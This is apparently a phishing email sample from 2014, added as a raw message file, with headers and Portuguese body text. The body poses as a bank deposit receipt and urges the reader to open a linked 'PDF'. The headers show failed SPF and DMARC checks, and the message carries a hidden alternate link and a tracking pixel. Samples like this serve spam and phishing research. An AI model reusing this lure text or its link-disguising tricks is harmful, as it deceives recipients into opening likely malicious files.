@@ -1,0 +1,103 @@
+Delivered-To: ajuver@gmail.com
+Received: by 10.42.90.205 with SMTP id l13csp459740icm;
+        Fri, 20 Jun 2014 22:03:59 -0700 (PDT)
+X-Received: by 10.52.110.105 with SMTP id hz9mr5859862vdb.9.1403327038687;
+        Fri, 20 Jun 2014 22:03:58 -0700 (PDT)
+Return-Path: <return@mercadofutebol.eu>
+Received: from rdns-13.b2brasil.tk (rdns-13.b2target.com. [212.83.163.202])
+        by mx.google.com with ESMTP id wn1si5276079vdc.45.2014.06.20.22.03.58
+        for <ajuver@gmail.com>;
+        Fri, 20 Jun 2014 22:03:58 -0700 (PDT)
+Received-SPF: fail (google.com: domain of return@mercadofutebol.eu does not designate 212.83.163.202 as permitted sender) client-ip=212.83.163.202;
+Authentication-Results: mx.google.com;
+       spf=hardfail (google.com: domain of return@mercadofutebol.eu does not designate 212.83.163.202 as permitted sender) smtp.mail=return@mercadofutebol.eu;
+       dkim=pass header.i=@b2brasil.tk;
+       dmarc=fail (p=NONE dis=NONE) header.from=mercadofutebol.eu
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=b2brasil.tk;
+ h=To:Subject:Message-ID:Date:From:Reply-To:MIME-Version:List-Unsubscribe:Content-Type:Content-Transfer-Encoding; i=abuse@b2brasil.tk;
+ bh=dg/wCtyeGHZhk2omQW5pBPmfjVk=;
+ b=jSaMxFJBHDhTMfhLGvuYOtFUR7KE63ioNXfdaFnBH/M4SFNqdiws3RXNHkDzZUokrr85tgUKwdZH
+   l0PSrDhDUAfaK+rWOVxUsO/OZNBO37IgOofJwl5W7Id7qiDuAIBOsDtRptjlIcCbpqRJtSC7Fm62
+   WMmJ3duPl2OLIKtWMDs=
+To: ajuver@gmail.com
+Subject: Comprovante enviado
+Message-ID: <31b76f8f83a0d35c974c2eefd4cda5f3@mercadofutebol.eu>
+Return-Path: return@mercadofutebol.eu
+Date: Fri, 20 Jun 2014 12:21:15 -0300
+From: "GRUPO L&M LTDA" <send@mercadofutebol.eu>
+Reply-To: send@mercadofutebol.eu
+MIME-Version: 1.0
+X-Mailer-LID: 9
+List-Unsubscribe: <http://mercadofutebol.eu/unsubscribe.php?M=1508337&C=cdf1f7cc12aa299571d26b4bf5bab421&L=9&N=13>
+X-Mailer-RecptId: 1508337
+X-Mailer-SID: 13
+X-Mailer-Sent-By: 1
+Content-Type: multipart/alternative; charset="UTF-8"; boundary="b1_af059803fd9a6c9ea01aef028b7fdb86"
+Content-Transfer-Encoding: 8bit
+X-Antivirus: avast! (VPS 141014-1, 14/10/2014), Inbound message
+X-Antivirus-Status: Clean
+
+--b1_af059803fd9a6c9ea01aef028b7fdb86
+Content-Type: text/plain; format=flowed; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+Esta mensagem, refere-se ao Comprovante Eletrônico de Depósito em sua
+Conta Corrente Nº 5463767337 -
+ emitida pelo prestador de serviços:
+ ______________________________________________________________________
+ Este arquivo deve ser armazenado.
+
+
+  [http://mercadofutebol.eu/link.php?M=1508337&N=13&L=2&F=T]
+  COMPROVANTE_DEPOSITO (25) KB
+[http://mercadofutebol.eu/link.php?M=1508337&N=13&L=2&F=T]
+
+
+
+
+ Segue em anexo a cópia do COMPROVANTE de DEPÓSITO em PDF onde está a
+descirminado demais detalhes do crédito.
+ Informamos que o valor foi creditado em sua conta com sucesso!
+ Confira o Valor Creditado em Conta. Qualquer dúvida em relação entrar
+em contato conosco que explicaremos!
+
+
+Clique neste link para ser removido:
+http://mercadofutebol.eu/unsubscribe.php?M=1508337&C=cdf1f7cc12aa299571d26b4bf5bab421&L=9&N=13
+
+--b1_af059803fd9a6c9ea01aef028b7fdb86
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+<html>
+<head>
+</head>
+<body>
+Esta mensagem, refere-se ao Comprovante Eletr&ocirc;nico de Dep&oacute;sito
+em sua Conta Corrente <strong>N&ordm; 5463767337 -</strong> <br />
+<p align="center"><b> </b>emitida pelo prestador de servi&ccedil;os:<br />
+______________________________________________________________________<br
+/> <strong>Este arquivo deve ser armazenado</strong>.</p>
+<br /> <a
+href="http://mercadofutebol.eu/link.php?M=1508337&N=13&L=2&F=H"><img
+alt="http://colombes.es/stats/index3.php?=nf002whorkshop.pdf"
+src="http://www.cperi.certh.gr/hydecon/images/icone_pdf.png" /></a><br />
+<span><strong><a
+href="http://mercadofutebol.eu/link.php?M=1508337&N=13&L=2&F=H">
+<small>COMPROVANTE_DEPOSITO</small> (25) KB</a></strong></span><br /> <br
+/> <br /> <br /> <br /> Segue em anexo a c&oacute;pia do<b> COMPROVANTE de
+DEP&Oacute;SITO</b> em <b>PDF</b> onde est&aacute; a descirminado demais
+detalhes do cr&eacute;dito.<br /> Informamos que o valor foi creditado em
+sua conta com <b>sucesso</b>!<br /> Confira o Valor Creditado em Conta.
+Qualquer d&uacute;vida em rela&ccedil;&atilde;o entrar em contato conosco
+que explicaremos!<br /> <br />
+<img
+src="http://mercadofutebol.eu/open.php?M=1508337&L=9&N=13&F=H&image=.jpg"
+height="1" width="10"><br/><a
+href="http://mercadofutebol.eu/unsubscribe.php?M=1508337&C=cdf1f7cc12aa299571d26b4bf5bab421&L=9&N=13">Clique
+aqui para ser removido</a></body>
+</html>
+
+--b1_af059803fd9a6c9ea01aef028b7fdb86--
+
+
